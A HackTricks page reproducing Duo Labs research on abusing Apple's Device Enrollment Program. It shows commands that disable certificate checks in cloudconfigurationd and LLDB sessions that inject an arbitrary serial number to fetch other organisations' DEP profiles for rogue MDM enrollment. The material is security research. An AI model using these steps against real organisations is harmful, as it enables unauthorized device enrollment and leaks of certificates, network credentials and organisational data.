# Enrolling Devices in Other Organisations

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Intro

As [**previously commented**](./#what-is-mdm-mobile-device-management)**,** in order to try to enrol a device into an organization **only a Serial Number belonging to that Organization is needed**. Once the device is enrolled, several organizations will install sensitive data on the new device: certificates, applications, WiFi passwords, VPN configurations [and so on](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf).\
Therefore, this could be a dangerous entrypoint for attackers if the enrolment process isn't correctly protected.

**The following research is taken from** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe)

## Reversing the process

### Binaries Involved in DEP and MDM

Throughout our research, we explored the following:

* **`mdmclient`**: Used by the OS to communicate with an MDM server. On macOS 10.13.3 and earlier, it can also be used to trigger a DEP check-in.
* **`profiles`**: A utility that can be used to install, remove and view Configuration Profiles on macOS. It can also be used to trigger a DEP check-in on macOS 10.13.4 and newer.
* **`cloudconfigurationd`**: The Device Enrollment client daemon, which is responsible for communicating with the DEP API and retrieving Device Enrollment profiles.

When using either `mdmclient` or `profiles` to initiate a DEP check-in, the `CPFetchActivationRecord` and `CPGetActivationRecord` functions are used to retrieve the _Activation Record_. `CPFetchActivationRecord` delegates control to `cloudconfigurationd` through [XPC](https://developer.apple.com/documentation/xpc), which then retrieves the _Activation Record_ from the DEP API.

`CPGetActivationRecord` retrieves the _Activation Record_ from cache, if available. These functions are defined in the private Configuration Profiles framework, located at `/System/Library/PrivateFrameworks/Configuration Profiles.framework`.

### Reverse Engineering the Tesla Protocol and Absinthe Scheme

During the DEP check-in process, `cloudconfigurationd` requests an _Activation Record_ from _iprofiles.apple.com/macProfile_. The request payload is a JSON dictionary containing two key-value pairs:

```
{
"sn": "",
action": "RequestProfileConfiguration
}
```

The payload is signed and encrypted using a scheme internally referred to as "Absinthe." The encrypted payload is then Base 64 encoded and used as the request body in an HTTP POST to _iprofiles.apple.com/macProfile_.

In `cloudconfigurationd`, fetching the _Activation Record_ is handled by the `MCTeslaConfigurationFetcher` class. The general flow from `[MCTeslaConfigurationFetcher enterState:]` is as follows:

```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```

Since the **Absinthe** scheme is what appears to be used to authenticate requests to the DEP service, **reverse engineering** this scheme would allow us to make our own authenticated requests to the DEP API. This proved to be **time consuming**, though, mostly because of the number of steps involved in authenticating requests. Rather than fully reversing how this scheme works, we opted to explore other methods of inserting arbitrary serial numbers as part of the _Activation Record_ request.

### MITMing DEP Requests

We explored the feasibility of proxying network requests to _iprofiles.apple.com_ with [Charles Proxy](https://www.charlesproxy.com). Our goal was to inspect the payload sent to _iprofiles.apple.com/macProfile_, then insert an arbitrary serial number and replay the request. As previously mentioned, the payload submitted to that endpoint by `cloudconfigurationd` is in [JSON](https://www.json.org) format and contains two key-value pairs.

```
{
"action": "RequestProfileConfiguration",
sn": "
}
```

Since the API at _iprofiles.apple.com_ uses [Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security) (TLS), we needed to enable SSL Proxying in Charles for that host to see the plain text contents of the SSL requests.

However, the `-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` method checks the validity of the server certificate, and will abort if server trust cannot be verified.

```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```

The error message shown above is located in a binary _Errors.strings_ file with the key `CLOUD_CONFIG_SERVER_TRUST_ERROR`, which is located at `/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`, along with other related error messages.

```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```

The _Errors.strings_ file can be [printed in a human-readable format](https://duo.com/labs/research/mdm-me-maybe#error\_strings\_output) with the built-in `plutil` command.

```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```

After looking into the `MCTeslaConfigurationFetcher` class further, though, it became clear that this server trust behavior can be circumvented by enabling the `MCCloudConfigAcceptAnyHTTPSCertificate` configuration option on the `com.apple.ManagedClient.cloudconfigurationd` preference domain.

```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```

The `MCCloudConfigAcceptAnyHTTPSCertificate` configuration option can be set with the `defaults` command.

```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```

With SSL Proxying enabled for _iprofiles.apple.com_ and `cloudconfigurationd` configured to accept any HTTPS certificate, we attempted to man-in-the-middle and replay the requests in Charles Proxy.

However, since the payload included in the body of the HTTP POST request to _iprofiles.apple.com/macProfile_ is signed and encrypted with Absinthe, (`NACSign`), **it isn't possible to modify the plain text JSON payload to include an arbitrary serial number without also having the key to decrypt it**. Although it would be possible to obtain the key because it remains in memory, we instead moved on to exploring `cloudconfigurationd` with the [LLDB](https://lldb.llvm.org) debugger.

### Instrumenting System Binaries That Interact With DEP

The final method we explored for automating the process of submitting arbitrary serial numbers to _iprofiles.apple.com/macProfile_ was to instrument native binaries that either directly or indirectly interact with the DEP API. This involved some initial exploration of the `mdmclient`, `profiles`, and `cloudconfigurationd` in [Hopper v4](https://www.hopperapp.com) and [Ida Pro](https://www.hex-rays.com/products/ida/), and some lengthy debugging sessions with `lldb`.

One of the benefits of this method over modifying the binaries and re-signing them with our own key is that it sidesteps some of the entitlements restrictions built into macOS that might otherwise deter us.

**System Integrity Protection**

In order to instrument system binaries, (such as `cloudconfigurationd`) on macOS, [System Integrity Protection](https://support.apple.com/en-us/HT204899) (SIP) must be disabled. SIP is a security technology that protects system-level files, folders, and processes from tampering, and is enabled by default on OS X 10.11 “El Capitan” and later. [SIP can be disabled](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System\_Integrity\_Protection\_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) by booting into Recovery Mode and running the following command in the Terminal application, then rebooting:

```
csrutil enable --without debug
```

It’s worth noting, however, that SIP is a useful security feature and should not be disabled except for research and testing purposes on non-production machines. It’s also possible (and recommended) to do this on non-critical Virtual Machines rather than on the host operating system.

**Binary Instrumentation With LLDB**

With SIP disabled, we were then able to move forward with instrumenting the system binaries that interact with the DEP API, namely, the `cloudconfigurationd` binary. Because `cloudconfigurationd` requires elevated privileges to run, we need to start `lldb` with `sudo`.

```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```

While `lldb` is waiting, we can then attach to `cloudconfigurationd` by running `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window. Once attached, output similar to the following will be displayed and LLDB commands can be typed at the prompt.

```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```

**Setting the Device Serial Number**

One of the first things we looked for when reversing `mdmclient` and `cloudconfigurationd` was the code responsible for retrieving the system serial number, as we knew the serial number was ultimately responsible for authenticating the device. Our goal was to modify the serial number in memory after it is retrieved from the [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), and have that be used when `cloudconfigurationd` constructs the `macProfile` payload.

Although `cloudconfigurationd` is ultimately responsible for communicating with the DEP API, we also looked into whether the system serial number is retrieved or used directly within `mdmclient`. The serial number retrieved as shown below is not what is sent to the DEP API, but it did reveal a hard-coded serial number that is used if a specific configuration option is enabled.

```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```

The system serial number is retrieved from the [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), unless the return value of `sub_10002000f` is nonzero, in which case it’s set to the static string “2222XXJREUF”. Upon inspecting that function, it appears to check whether “Server stress test mode” is enabled.

```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```

We documented the existence of “server stress test mode,” but didn’t explore it any further, as our goal was to modify the serial number presented to the DEP API. Instead, we tested whether modifying the serial number pointed to by the `r14` register would suffice in retrieving an _Activation Record_ that was not meant for the machine we were testing on.

Next, we looked at how the system serial number is retrieved within `cloudconfigurationd`.

```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```

As can be seen above, the serial number is retrieved from the [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) in `cloudconfigurationd` as well.

Using `lldb`, we were able to modify the serial number retrieved from the [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) by setting a breakpoint for `IOServiceGetMatchingService` and creating a new string variable containing an arbitrary serial number and rewriting the `r14` register to point to the memory address of the variable we created.

```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```

Although we were successful in modifying the serial number retrieved from the [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), the `macProfile` payload still contained the system serial number, not the one we wrote to the `r14` register.

**Exploit: Modifying the Profile Request Dictionary Prior to JSON Serialization**

Next, we tried setting the serial number that is sent in the `macProfile` payload in a different way. This time, rather than modifying the system serial number retrieved via [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), we tried to find the closest point in the code where the serial number is still in plain text before being signed with Absinthe (`NACSign`). The best point to look at appeared to be `-[MCTeslaConfigurationFetcher startConfigurationFetch]`, which roughly performs the following steps:

* Creates a new `NSMutableData` object
* Calls `[MCTeslaConfigurationFetcher setConfigurationData:]`, passing it the new `NSMutableData` object
* Calls `[MCTeslaConfigurationFetcher profileRequestDictionary]`, which returns an `NSDictionary` object containing two key-value pairs:
* `sn`: The system serial number
* `action`: The remote action to perform (with `sn` as its argument)
* Calls `[NSJSONSerialization dataWithJSONObject:]`, passing it the `NSDictionary` from `profileRequestDictionary`
* Signs the JSON payload using Absinthe (`NACSign`)
* Base64 encodes the signed JSON payload
* Sets the HTTP method to `POST`
* Sets the HTTP body to the base64 encoded, signed JSON payload
* Sets the `X-Profile-Protocol-Version` HTTP header to `1`
* Sets the `User-Agent` HTTP header to `ConfigClient-1.0`
* Uses the `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` method to perform the HTTP request

We then modified the `NSDictionary` object returned from `profileRequestDictionary` before being converted into JSON. To do this, a breakpoint was set on `dataWithJSONObject` in order to get us as close as possible to the as-yet unconverted data as possible. The breakpoint was successful, and when we printed the contents of the register we knew through the disassembly (`rdx`) that we got the results we expected to see.

```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```

The above is a pretty-printed representation of the `NSDictionary` object returned by `[MCTeslaConfigurationFetcher profileRequestDictionary]`. Our next challenge was to modify the in-memory `NSDictionary` containing the serial number.

```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```

The listing above does the following:

* Creates a regular expression breakpoint for the `dataWithJSONObject` selector
* Waits for the `cloudconfigurationd` process to start, then attaches to it
* `continue`s execution of the program, (because the first breakpoint we hit for `dataWithJSONObject` is not the one called on the `profileRequestDictionary`)
* Creates and prints (in hex format due to the `/x`) the result of creating our arbitrary `NSDictionary`
* Since we already know the names of the required keys we can simply set the serial number to one of our choice for `sn` and leave action alone
* The printout of the result of creating this new `NSDictionary` tells us we have two key-value pairs at a specific memory location

Our final step was now to repeat the same step of writing to `rdx` the memory location of our custom `NSDictionary` object that contains our chosen serial number:

```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```

This points the `rdx` register to our new `NSDictionary` right before it's serialized to [JSON](https://www.json.org) and `POST`ed to _iprofiles.apple.com/macProfile_, then `continue`s program flow.

This method of modifying the serial number in the profile request dictionary before being serialized to JSON worked. When using a known-good DEP-registered Apple serial number instead of (null), the debug log for `ManagedClient` showed the complete DEP profile for the device:

```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```

With just a few `lldb` commands we can successfully insert an arbitrary serial number and get a DEP profile that includes various organization-specific data, including the organization's MDM enrollment URL. As discussed, this enrollment URL could be used to enroll a rogue device now that we know its serial number. The other data could be used to social engineer a rogue enrollment. Once enrolled, the device could receive any number of certificates, profiles, applications, VPN configurations and so on.

### Automating `cloudconfigurationd` Instrumentation With Python

Once we had the initial proof-of-concept demonstrating how to retrieve a valid DEP profile using just a serial number, we set out to automate this process to show how an attacker might abuse this weakness in authentication.

Fortunately, the LLDB API is available in Python through a [script-bridging interface](https://lldb.llvm.org/python-reference.html). On macOS systems with the [Xcode Command Line Tools](https://developer.apple.com/download/more/) installed, the `lldb` Python module can be imported as follows:

```
import lldb
```

This made it relatively easy to script our proof-of-concept demonstrating how to insert a DEP-registered serial number and receive a valid DEP profile in return. The PoC we developed takes a list of serial numbers separated by newlines and injects them into the `cloudconfigurationd` process to check for DEP profiles.

![Charles SSL Proxying Settings.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![DEP Notification.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### Impact

There are a number of scenarios in which Apple's Device Enrollment Program could be abused that would lead to exposing sensitive information about an organization. The two most obvious scenarios involve obtaining information about the organization that a device belongs to, which can be retrieved from the DEP profile. The second is using this information to perform a rogue DEP and MDM enrollment. Each of these are discussed further below.

#### Information Disclosure

As mentioned previously, part of the DEP enrollment process involves requesting and receiving an _Activation Record_, (or DEP profile), from the DEP API. By providing a valid, DEP-registered system serial number, we're able to retrieve the following information, (either printed to `stdout` or written to the `ManagedClient` log, depending on macOS version).

```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```

Although some of this information might be publicly available for certain organizations, having a serial number of a device owned by the organization along with the information obtained from the DEP profile could be used against an organization's help desk or IT team to perform any number of social engineering attacks, such as requesting a password reset or help enrolling a device in the company's MDM server.

#### Rogue DEP Enrollment

The [Apple MDM protocol](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf) supports - but does not require - user authentication prior to MDM enrollment via [HTTP Basic Authentication](https://en.wikipedia.org/wiki/Basic\_access\_authentication). **Without authentication, all that's required to enroll a device in an MDM server via DEP is a valid, DEP-registered serial number**. Thus, an attacker that obtains such a serial number, (either through [OSINT](https://en.wikipedia.org/wiki/Open-source\_intelligence), social engineering, or by brute-force), will be able to enroll a device of their own as if it were owned by the organization, as long as it's not currently enrolled in the MDM server. Essentially, if an attacker is able to win the race by initiating the DEP enrollment before the real device, they're able to assume the identity of that device.

Organizations can - and do - leverage MDM to deploy sensitive information such as device and user certificates, VPN configuration data, enrollment agents, Configuration Profiles, and various other internal data and organizational secrets. Additionally, some organizations elect not to require user authentication as part of MDM enrollment. This has various benefits, such as a better user experience, and not having to [expose the internal authentication server to the MDM server to handle MDM enrollments that take place outside of the corporate network](https://docs.simplemdm.com/article/93-ldap-authentication-with-apple-dep).

This presents a problem when leveraging DEP to bootstrap MDM enrollment, though, because an attacker would be able to enroll any endpoint of their choosing in the organization's MDM server. Additionally, once an attacker successfully enrolls an endpoint of their choosing in MDM, they may obtain privileged access that could be used to further pivot within the network.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
